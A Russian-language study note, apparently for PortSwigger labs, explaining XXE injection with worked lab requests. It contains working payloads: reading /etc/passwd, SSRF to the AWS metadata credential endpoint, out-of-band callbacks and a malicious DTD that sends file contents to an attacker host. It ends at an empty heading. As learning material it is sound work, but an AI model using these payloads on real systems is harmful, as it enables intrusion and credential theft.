# Карта раздела
[[Карта раздела Types Of Vulnerabilities in Web]]

---
# Оглавление



---


> [!note] Определение SSRF
> XML external entity injection - это уязвимость веб-безопасности, позволяющая атакующему вмешиваться в обработку приложением XML данных, часто это позволяет просматривать файлы в файловой системе сервера и взаимодействовать с любыми внутренними или внешними системами к которым само приложение имеет доступ
> В некоторых ситуациях атакующий может эскалировать XXE атаку до компроментации базового сервера или другой серверной инфраструктуры используя уязвимость XXE для выполнения SSRF атак

---
# Возникновение уязвимости XXE 
Некоторые приложения используют формат XML для передачи данных между браузером и сервером, такие приложения почти всегда используют стандартную библиотеку или платформенный API для обработки XML на сервере. Уязвимость XXE возникает потому что спецификация XML содержит различные потенциально опасные возможности и стандартные парсеры поддерживают эти возможности, даже если приложение обычно их не использует

[[Сущности XML (entities)]] - Внешние сущности XML являются основным механизмом посредством которого возникает XXE injection

# Типы атак XXE

[[#Эксплуатация XXE для извлечения файлов]] атака при  которой внешняя сущность определяется как содержимое файла и возвращается в ответе приложения
[[#Эксплуатация XXE для выполнения SSRF атак]] атака при которой внешняя сущность определяется на основе URL внутренней системы
[[#Эксплуатация слепой XXE для внеполосной эксфильтрации данных]] атака при которое конфиденциальные данные передаются с сервера приложения в систему контролируемую злоумышленником
[[#Эксплуатация слепой XXE для извлечения данных через сообщения об ошибках]] атака при которой злоумышленник может вызвать сообщение об ошибке парсинга, содержащее конфиденциальную информацию

---
# Эксплуатация XXE для извлечения файлов
Чтобы выполнить XXE инъекцию извлекающую произвольный файл из файловой системы сервера, нужно изменить отправляемый XML двумя способами:
- Ввести или отредактировать элемент `DOCTYPE`, который определяет внешнюю сущность, содержащую путь к файлу
- Изменить значение данных в XML которое возвращается в ответе приложения, чтобы использовать определенную внешнюю сущность
Например предположим что приложение интернет магазина проверяет наличие товара на складе, отправляя на сервер 
следующий XML

```XML
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck><productId>381</productId></stockCheck>
```

Приложение не применяет специальных защит от XXE-атак, поэтому вы можете использовать уязвимость XXE для извлечения файла /etc/passwd, отправив следующую XXE полезную нагрузку:

```XML
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```

Эта XXE нагрузка определяет внешнюю сущность `&xxe` значение которой это содержимое файла `/etc/passwd` и использует сущность внутри значения `productId`, это приводит к тому, что ответ приложения включает в себя содержимое файла

```
Invalid product ID: root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
```


> [!warning] ВАЖНО!
> В реальных XXE зачастую присутствует множество значений данных в отправляемом XML, любое из которых может быть использовано в ответе приложения. Чтобы систематически тестировать XXE-уязвимости, как правило, нужно проверять каждый узел данных в XML по отдельности, используя определенную сущность и проверять, появляется ли она в ответе приложения

## Пример Lab: Exploiting XXE using external entities to retrieve files
Уязвимость находится в `Check Stock`, формируется следующий HTTP ответ
```HTTP
POST /product/stock HTTP/2
Host: 0a9b002404b84cbf81802a7c001d00ac.web-security-academy.net
Cookie: session=seDQJuL1fbWfIXRDhgUjiudWkXq4TU4v
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a9b002404b84cbf81802a7c001d00ac.web-security-academy.net/product?productId=1
Content-Type: application/xml
Content-Length: 109
Origin: https://0a9b002404b84cbf81802a7c001d00ac.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers

<?xml version="1.0" encoding="UTF-8"?>
<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```
Можем определить свою сущность для этого XML, тогда создаем сущность следующего вида
```
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd">]>
```

и пробуем протестировать первый параметр это `productId`, получаем запрос вида: 

```HTTP
POST /product/stock HTTP/2
Host: 0a9b002404b84cbf81802a7c001d00ac.web-security-academy.net
Cookie: session=seDQJuL1fbWfIXRDhgUjiudWkXq4TU4v
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a9b002404b84cbf81802a7c001d00ac.web-security-academy.net/product?productId=1
Content-Type: application/xml
Content-Length: 174
Origin: https://0a9b002404b84cbf81802a7c001d00ac.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```

после чего в ответе вернется содержимое файла `/etc/passwd`

---
# Эксплуатация XXE для выполнения SSRF атак
Помимо извлечения конфиденциальных данных, другой основной эффект атак XXE состоит в том что их можно использовать для выполнения SSRF

Чтобы эксплуатировать XXE для выполнения SSRF нужно определить внешнюю XML сущность, используя URL на который вы хотите нацелиться и использовать определенную определенную сущность в значении данных. Если вы можете использовать сущность в значении, которое возвращается в ответе приложения вы можете видеть ответ от URL внутри ответа приложения и с помощью этого получить двустороннее взаимодействие с внутренней системой. Если нет, вы сможете выполнять только "слепые" SSRF, но которые все еще могут иметь критические последствия

В Следующем примере XXE внешняя сущность заставит сервер выполнить внутренний HTTP запрос к системе в инфраструктуре организации
```
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internak.vulnerable-website.com/"> ]>
```

## Пример Lab: Exploiting XXE to perform SSRF attacks
В лабораторной работе сказано что нужно получить SSRF для внутреннего IP с помощью XXE injection, для этого нам необходимо создать внешнюю сущность на наш предложенный IP, так как мы знаем что IAM это сервис AWS для управления ролями, роль можно получить с помощью следующего пути `latest/meta-data/iam/security-credentials/`
В ответе получим следующее: 

```HTTP
HTTP/2 400 Bad Request
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 27

"Invalid product ID: admin"
```

В результате подставляем в наш путь `http://169.254.169.254/latest/meta-data/iam/security-credentials/admin` имя пользователя и получаем в ответе конфиденциальные данные, а полностью добавочная пользовательская внешняя сущность выглядит вот так: 
```XML
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```

Ответ сервера:

```HTTP
HTTP/2 400 Bad Request
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 552

"Invalid product ID: {
  "Code" : "Success",
  "LastUpdated" : "2026-03-22T04:17:48.385523483Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "mg4uYe2FjpI4pHutE4h1",
  "SecretAccessKey" : "Ntn4zVbnn8Xf8hUmMDYY9Zc99sUZTwpjudTI71Kl",
  "Token" : "2vyeIfUgN0aZFFsZ5Pfug16pT1EE2odPh4o01sad9J6QTDEzgqw1MXXjWnQM6MHCXtUIwIYlDmXf6OObHmMMkIvA7TRb9nK0rCJLYzbzeMDPcyvTvpVllmECq26gr3wssZwqvrUeJVNoxa07p8rKf2L9v5PI6PVEjxjYKCvhCINCjOhuhzTS1wDzXDUBS32lmxf96bB6cEJLX8Inc7PaLiTStLSPQFvoWRhSHBuVWZmzIaKF9CNSAMXb4WEedl4U",
  "Expiration" : "2032-03-20T04:17:48.385523483Z"
}"
```

# Слепые XXE уязвимости
Многие случаи XXE уязвимостей являются слепыми, их можно обнаруживать и эксплуатировать, но для этого требуются техники out-of-band, чтобы обнаружить уязвимости и эксфильтровать данные, также иногда можно вызвать ошибки парсинга XML которые приводят к раскрытию конфиденциальных данных в сообщениях об ошибках


> [!info] Определение
> "Слепые" XXE уязвимости возникают когда приложение уязвимо к XXE, но не возвращает значения каких либо определенных внешних сущностей в своих ответах. Это означает что прямое извлечение серверных файлов невозможно и поэтому слепая XXE как правило сложнее в эксплуатации, чем обычные XXE уязвимости

Существует два основных метода для обнаружения и эксплуатации слепых XXE уязвимостей

- Вызвать внеполосные сетевые взаимодействия(out-of-band), иногда эксфильтруя конфиденциальные данные в самих данных взаимодействия
- Вызвать ошибка парсинга XML таким образом, чтобы сообщения об ошибках содержали конфиденциальные данные

## Обнаружение слепой XXE с использованием OAST
Часто можно обнаружить слепую XXE, точно так же как и XXE для SSRF, но с триггером внеполосного сетевого взаимодействия с системой, которую вы контролируете. Например вы определяете внешнюю сущность 

```
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> ]>
```

Затем используем эту сущность в значении данных внутри XML

Эта XXE атака заставляет сервер выполнить внутренний HTTP запрос на указанный URL. Атакующий может отслеживать итоговый DNS запрос и HTTP запрос и таким образом определить что XXE атака была успешна
## Пример Lab: Blind XXE with out-of-band interaction
В лабораторной работе необходимо использовать OAST для инициализации запроса к нашему  Burp Coloborator серверу, для этого мы добавляем в запрос внешнюю сущность и используем ее в результате получаем следующий запрос для решения лабы: 
```HTTP
POST /product/stock HTTP/2
Host: 0a07008c032ae848802f170a004700b7.web-security-academy.net
Cookie: session=M3xkM8IqeW0Wq1toxqiLbAHhG8YhMRtX
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a07008c032ae848802f170a004700b7.web-security-academy.net/product?productId=1
Content-Type: application/xml
Content-Length: 204
Origin: https://0a07008c032ae848802f170a004700b7.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers

<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://pd66un153n4wuf9od0sin3xl1c73vujj.oastify.com"> ]><stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```

---
Иногда XXE-атаки с использованием обычных сущностей блокируются из за валидации ввода в приложение или ужесточения настроек используемого XML парсера, в такой ситуации можно попробовать использовать параметрические сущности XML.

Параметрическая сущность это особый вид XML сущностей, которые можно ссылать только внутри DTD. Для наших целей нужно знать два момента, во первых, объявление параметрической сущности XML включает символ процента перед именем сущности

```
<!ENTITY % myparameterentity "my parameter entity value" >
```

Во вторых параметрические сущности ссылаются с использованием символа процента заместо привычного амперсанда

```
%myparameterentity;
```
Это означает что вы можете тестировать слепую XXE с внеполосным детектированием через параметрические сущности следующим образом

```
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]>
```

Эта XXE нагрузка объявляет параметрическую сущность XML с именем `xxe` а затем использует ее внутри DTD, это вызовет DNS запрос и HTTP запрос к домену атакующего подтверждая успешность атаки
## Пример Lab: Blind XXE with out-of-band interaction via XML parameter entities
В лабораторной работе необходимо инициализировать запрос к нашему Colaborator, но здесь важно использовать параметрическую сущность, которая была рассмотрена выше, в процессе исследования получаем наш `POST` для проверки наличия товара и вставляем туда нашу параметрическую сущность
```HTTP
POST /product/stock HTTP/2
Host: 0a09008804bbcf9781c752f800ce00b2.web-security-academy.net
Cookie: session=68FuxGbA92HCrbbLRgHNnHLgPA4hu5ix
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a09008804bbcf9781c752f800ce00b2.web-security-academy.net/product?productId=1
Content-Type: application/xml
Content-Length: 208
Origin: https://0a09008804bbcf9781c752f800ce00b2.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers

<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://4248g9jn7ya3a8mqfx1p1h59n0trhj58.oastify.com"> %xxe; ]><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```
После чего лаба становится решенной

---
## Эксплуатация слепой XXE для внеполосной эксфильтрации данных
Обнаружение слепой XXE через внеполосные техники не демонстрирует практическую эксплуатацию уязвимости. Реальная цель атакующего это эксфильтрация конфиденциальных данных. Это можно реализовать через слепую XXE но для этого атакующему нужно разместить вредоносный DTD на контролируемой им системе и затем подключить внешний DTD из внутриполосной XXE нагрузки

Пример вредоносного DTD для эксфильтрации содержимого файла `/etc/passwd`

```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &\#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
%eval;
%exfiltrate;
```

Этот DTD выполняет следующие шаги

- Определяет параметрическую сущность XML `file`, содержащую имя файла `/etc/passwd`
- Определяет параметрическую сущность XML `eval`, содержащую динамическое объявление другой сущности, `exfiltrate`, причем сущность будет вычислена путем HTTP запроса на веб-сервер атакующего с влеченным в строку запроса значением сущности `file`
- Использует сущность `eval` что приводит к динамическому объявлению сущности `exfiltrate`
- Использует сущность `exfiltrate` из за чего ее значение вычисляется запросом указанного URL

Атакующий должен разместить вредоносный DTD на контролируемой системе, обычно загрузив его на собственный веб сервер. Например DTD может обслуживаться по следующему URL

```
http://web-attacker.com/malicious.dtd
```

Наконец атакующий отправляет в уязвимое приложение следующую XXE нагрузку 

```
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
```

Эта XXE нагрузка объявляет параметрическую сущность XML `xxe` а затем использует ее внутри DTD это заставит XML парсер загрузить внешний DTD с сервера атакующего и интерпретировать его inline. Затем выполняются шаги вредоносного DTD и файл `/etc/passwd` передается на сервер атакующего


> [!warning] ВАЖНО!
> Этот прием может не сработать с некоторыми типами содержимого файлов, включая символы новой строки, присутствующие в `/etc/passwd` Это потому что некоторые XML парсеры получают URL во внешней сущности через API, который валидирует допустимые символы URL. В такой ситуации можно попробовать использовать протокол FTP, вместо HTTP, иногда эксфильтрация данных содержащих символы новой строки невозможна и тогда можно нацелиться на файл `/etc/hostname`




## Эксплуатация слепой XXE для извлечения данных через сообщения об ошибках